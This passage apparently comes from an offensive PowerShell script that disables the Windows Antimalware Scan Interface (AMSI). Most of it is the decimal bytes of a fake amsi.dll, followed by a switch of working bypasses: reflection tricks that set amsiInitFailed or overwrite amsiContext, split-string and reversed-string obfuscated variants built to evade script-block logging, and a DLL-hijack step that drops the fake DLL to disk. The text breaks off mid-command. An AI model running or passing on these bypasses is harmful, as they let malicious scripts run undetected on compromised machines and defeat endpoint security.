16 72 139 69 16 36 6 60 6 117 50 139 5 140 18 0 0 131 200 8 199 5 123 18 0 0 3 0 0 0 246 69 232 32 137 5 117 18 0 0 116 19 131 200 32 199 5 98 18 0 0 5 0 0 0 137 5 96 18 0 0 51 192 72 139 92 36 56 72 131 196 32 93 195 204 204 204 51 192 57 5 92 18 0 0 15 149 192 195 194 0 0 204 204 204 204 204 255 37 178 2 0 0 255 37 164 2 0 0 255 37 150 2 0 0 255 37 136 2 0 0 255 37 122 2 0 0 255 37 228 2 0 0 255 37 214 2 0 0 255 37 200 2 0 0 255 37 186 2 0 0 255 37 172 2 0 0 255 37 158 2 0 0 255 37 144 2 0 0 255 37 130 2 0 0 255 37 116 2 0 0 255 37 30 2 0 0 204 204 176 1 195 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 255 224 64 85 72 131 236 32 72 139 234 138 77 64 72 131 196 32 93 233 4 250 255 255 204 64 85 72 131 236 32 72 139 234 232 45 248 255 255 138 77 56 72 131 196 32 93 233 232 249 255 255 204 64 85 72 131 236 48 72 139 234 72 139 1 139 16 72 137 76 36 40 137 84 36 32 76 141 13 161 241 255 255 76 139 69 112 139 85 104 72 139 77 96 232 93 247 255 255 144 72 131 196 48 93 195 204 64 85 72 139 234 72 139 1 51 201 129 56 5 0 0 192 15 148 193 139 193 93 195 204 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 216 29 0 128 1 0 0 0 80 30 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 48 0 128 1 0 0 0 240 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 136 29 62 87 0 0 0 0 2 0 0 0 65 0 0 0 116 34 0 0 116 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 184 34 0 0 184 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 13 0 0 0 68 2 0 0 204 34 0 0 204 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 32 0 128 1 0 0 0 0 33 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 82 83 68 83 42 80 223 113 29 247 64 69 188 37 18 40 145 144 25 190 50 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 120 54 52 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 18 0 0 0 18 0 0 0 1 0 0 0 17 0 0 0 71 67 84 76 0 16 0 0 63 14 0 0 46 116 101 120 116 36 109 110 0 0 0 0 64 30 0 0 18 0 0 0 46 116 101 120 116 36 109 110 36 48 48 0 82 30 0 0 129 0 0 0 46 116 101 120 116 36 120 0 0 32 0 0 248 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 248 32 0 0 16 0 0 0 46 48 48 99 102 103 0 0 8 33 0 0 8 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 16 33 0 0 8 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 24 33 0 0 8 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 32 33 0 0 8 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 40 33 0 0 8 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 48 33 0 0 8 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 56 33 0 0 8 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 64 33 0 0 8 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 80 33 0 0 36 1 0 0 46 114 100 97 116 97 0 0 116 34 0 0 156 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 16 37 0 0 8 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 24 37 0 0 8 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 32 37 0 0 8 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 40 37 0 0 8 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 48 37 0 0 60 1 0 0 46 120 100 97 116 97 0 0 108 38 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 168 38 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 192 38 0 0 248 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 184 39 0 0 200 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 52 0 0 0 46 100 97 116 97 0 0 0 64 48 0 0 0 6 0 0 46 98 115 115 0 0 0 0 0 64 0 0 176 1 0 0 46 112 100 97 116 97 0 0 0 80 0 0 16 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 96 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 96 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 17 21 8 0 21 116 9 0 21 100 7 0 21 52 6 0 21 50 17 224 236 29 0 0 1 0 0 0 207 16 0 0 92 17 0 0 82 30 0 0 0 0 0 0 17 15 6 0 15 100 8 0 15 52 6 0 15 50 11 112 236 29 0 0 1 0 0 0 246 17 0 0 20 18 0 0 105 30 0 0 0 0 0 0 1 6 2 0 6 50 2 80 1 20 8 0 20 100 8 0 20 84 7 0 20 52 6 0 20 50 16 112 9 26 6 0 26 52 15 0 26 114 22 224 20 112 19 96 236 29 0 0 1 0 0 0 102 18 0 0 54 19 0 0 133 30 0 0 54 19 0 0 1 6 2 0 6 82 2 80 1 9 1 0 9 98 0 0 1 8 4 0 8 114 4 112 3 96 2 48 9 4 1 0 4 34 0 0 236 29 0 0 1 0 0 0 215 23 0 0 101 24 0 0 187 30 0 0 101 24 0 0 1 2 1 0 2 80 0 0 1 4 1 0 4 66 0 0 1 6 2 0 6 50 2 48 1 13 4 0 13 52 10 0 13 114 6 80 1 13 4 0 13 52 9 0 13 50 6 80 1 21 5 0 21 52 186 0 21 1 184 0 6 80 0 0 1 15 6 0 15 100 7 0 15 52 6 0 15 50 11 112 1 13 4 0 13 52 7 0 13 50 6 80 0 0 0 0 1 0 0 0 56 39 0 0 0 0 0 0 0 0 0 0 62 40 0 0 120 32 0 0 104 39 0 0 0 0 0 0 0 0 0 0 6 41 0 0 168 32 0 0 192 38 0 0 0 0 0 0 0 0 0 0 114 42 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 8 0 95 95 67 95 115 112 101 99 105 102 105 99 95 104 97 110 100 108 101 114 0 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 62 0 109 101 109 115 101 116 0 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 54 0 95 105 110 105 116 116 101 114 109 0 55 0 95 105 110 105 116 116 101 114 109 95 101 0 63 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 51 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 52 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 60 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 34 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 30 0 95 99 114 116 95 97 116 101 120 105 116 0 22 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 174 4 82 116 108 67 97 112 116 117 114 101 67 111 110 116 101 120 116 0 181 4 82 116 108 76 111 111 107 117 112 70 117 110 99 116 105 111 110 69 110 116 114 121 0 0 188 4 82 116 108 86 105 114 116 117 97 108 85 110 119 105 110 100 0 0 146 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 82 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 15 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 112 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 112 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 48 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 16 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 20 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 221 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 84 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 106 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 50 162 223 45 153 43 0 0 205 93 32 210 102 212 255 255 255 255 255 255 0 0 0 0 1 0 0 0 2 0 0 0 47 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 16 0 0 65 16 0 0 48 37 0 0 68 16 0 0 148 16 0 0 16 38 0 0 148 16 0 0 191 17 0 0 52 37 0 0 192 17 0 0 66 18 0 0 96 37 0 0 68 18 0 0 76 19 0 0 164 37 0 0 76 19 0 0 160 19 0 0 144 37 0 0 160 19 0 0 221 19 0 0 72 38 0 0 224 19 0 0 20 20 0 0 24 38 0 0 20 20 0 0 229 20 0 0 212 37 0 0 232 20 0 0 89 21 0 0 220 37 0 0 92 21 0 0 149 21 0 0 16 38 0 0 152 21 0 0 184 21 0 0 16 38 0 0 184 21 0 0 205 21 0 0 16 38 0 0 208 21 0 0 248 21 0 0 16 38 0 0 248 21 0 0 13 22 0 0 16 38 0 0 16 22 0 0 113 22 0 0 144 37 0 0 116 22 0 0 164 22 0 0 16 38 0 0 164 22 0 0 184 22 0 0 16 38 0 0 184 22 0 0 1 23 0 0 24 38 0 0 4 23 0 0 205 23 0 0 32 38 0 0 208 23 0 0 108 24 0 0 232 37 0 0 108 24 0 0 144 24 0 0 24 38 0 0 144 24 0 0 187 24 0 0 24 38 0 0 188 24 0 0 11 25 0 0 24 38 0 0 12 25 0 0 35 25 0 0 16 38 0 0 36 25 0 0 208 25 0 0 44 38 0 0 252 25 0 0 23 26 0 0 16 38 0 0 32 26 0 0 101 27 0 0 56 38 0 0 104 27 0 0 178 27 0 0 72 38 0 0 180 27 0 0 254 27 0 0 72 38 0 0 8 28 0 0 201 29 0 0 88 38 0 0 80 30 0 0 82 30 0 0 104 38 0 0 82 30 0 0 105 30 0 0 136 37 0 0 105 30 0 0 133 30 0 0 136 37 0 0 133 30 0 0 187 30 0 0 204 37 0 0 187 30 0 0 211 30 0 0 8 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 11 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 96 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 24 0 0 0 248 160 0 161 88 161 96 161 56 162 80 162 88 162 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\" if (([IntPtr]::Size) -eq 8) { Write-Verbose \"64 bit process detected.\" $DllBytes = $AmsiX64 } elseif (([IntPtr]::Size) -eq 4) { Write-Verbose \"32 bit process detected.\" $DllBytes = $AmsiX86 } switch($method) { \"unload\" { Write-Verbose \"Using Matt Graeber's Reflection method.\" if ($ShowOnly -eq $True) { Write-Output \"Use the following scriptblock before you run a script which gets detected.\" Write-Output '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)' } else { Write-Output \"Executing the bypass.\" [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } } \"unloadsilent\" { Write-Verbose \"Using Matt Graeber's Reflection method with WMF5 autologging bypass.\" if ($ShowOnly -eq $True) { Write-Output \"Use the following scriptblock before you run a script which gets detected.\" Write-Output '[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags'')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType(''System.T''+''ype'')), [Object]([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')),(''GetFie''+''ld'')).Invoke(''amsiInitFailed'',((''Non''+''Public,Static'') -as [String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags''))).SetValue($null,$True)' } else { Write-Output \"Executing the bypass.\" [Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True) } } \"unloadobfuscated\" { Write-Verbose \"Using Matt Graeber's Reflection method with obfuscation from Daneil Bohannon's Invoke-Obfuscation - which bypasses WMF5 autologging.\" if ($ShowOnly -eq $True) { $code = @\" Sv ('R9'+'HYt') ( \" ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI\" ); Invoke-Expression( -Join ( VaRIAbLe ('R9'+'hyT') -val )[ - 1..- (( VaRIAbLe ('R9'+'hyT') -val ).Length)]) \"@ Write-Output \"Use the following scriptblock before you run a script which gets detected.\" Write-Output $code } else { Write-Output \"Executing the bypass.\" Sv ('R9'+'HYt') ( \" ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI\" ); Invoke-Expression( -Join ( VaRIAbLe ('R9'+'hyT') -val )[ - 1..- (( VaRIAbLe ('R9'+'hyT') -val ).Length)]) } } \"unload2\" { Write-Verbose \"Using Matt Graeber's second Reflection method.\" if ($ShowOnly -eq $True) { Write-Output \"Use the following scriptblock before you run a script which gets detected.\" Write-Output '[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiContext'',[Reflection.BindingFlags]''NonPublic,Static'').GetValue($null),0x41414141)' } else { Write-Output \"Executing the bypass.\" [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141) } } \"dllhijack\" { Write-Verbose \"Using Cornelis de Plaa's DLL hijack method.\" if ($ShowOnly -eq $True) { Write-Output \"Copy powershell.exe from C:\\Windows\\System32\\WindowsPowershell\\v1.0 to a local folder and dropa fake amsi.dll in the same directory.\" Write-Output \"Run the new powershell.exe and AMSI should be gone for that session.\" } else { [Byte[]] $temp = $DllBytes -split ' ' Write-Output \"Executing the bypass.\" Write-Verbose \"Dropping the fake amsi.dll to disk.\" [System.IO.File]::WriteAllBytes(\"$pwd\\amsi.dll\", $temp) Write-Verbose \"Copying 